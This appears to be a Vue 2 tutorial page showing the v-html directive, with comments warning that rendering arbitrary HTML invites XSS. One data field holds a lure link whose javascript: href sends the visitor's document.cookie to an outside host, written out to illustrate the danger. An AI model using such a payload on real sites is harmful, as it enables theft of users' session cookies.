<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <title>2.v-html_指令</title>
        <!-- 引入vue -->
        <script type="text/javascript" src="../js/vue.js"></script>
        <script type="text/javascript" src="../js/dayjs.min.js"></script>
    </head>

    <body>

        <!-- 
            v-html指令:
            1.作用:向指定节点中渲染包含htm1结构的内容2.与插值语法的区别:
                (1).v-htm1会替换掉节点中所有的内容，{{xx}}则不会。
                (2).v-html可以识别html结构。
            3.严重注意: v-htm1有安全性问题!! ! !
                (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                (2).一定要在可信的内容上使用v-htm1，永不要用在用户提交的内容上!
         -->
     
        <div id="root">
           <div>{{name}}</div>
           <div v-html="str"></div>
           <div v-html="str2"></div>
        </div>
       
        

        
    <script type="text/javascript">
        Vue.config.productionTip = false;//阻止vue在启动时产生提示
       
        new Vue({ 
        el: '#root',
        data: {
            name:'尚硅谷',
            str:'<h3>你好啊!</h3>',
            str2:'<a href = javaScript:location.href="http://www.baidu.com?"+document.cookie  >兄弟我找到你想要的资源了，快来！</a>',
        },
        });

    </script>
    </body>
</html>
